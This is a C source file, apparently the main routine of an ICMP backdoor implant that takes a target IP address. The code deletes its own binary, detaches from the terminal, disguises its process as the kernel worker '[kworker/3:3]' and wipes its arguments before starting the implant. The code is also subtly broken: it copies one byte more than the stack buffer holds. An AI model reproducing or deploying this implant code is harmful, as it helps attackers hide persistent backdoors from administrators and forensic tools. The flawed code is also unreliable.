#include "../include/implant.h"

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: ./icmp-implant [IP-ADDRESS]");
        return 1;
    }
    size_t ip_len = strlen(argv[1]);
    char target[ip_len];
    memmove(target, argv[1], ip_len);

    // remove implant upon execution
    unlink(argv[0]);

    // detach from tty to impersonate a daemon
    ioctl(0, TIOCNOTTY);

    // save the arg for later
    memmove(target, argv[1], ip_len + 1);

    // process masquerading, change the command name associated with the process (/proc/<pid>/comm)
    prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL);
    memmove(argv[0], "[kworker/3:3]", ip_len + 1);
    memmove(argv[1], "\0", ip_len);

    implant_init_n_call(target);
    return 0;
}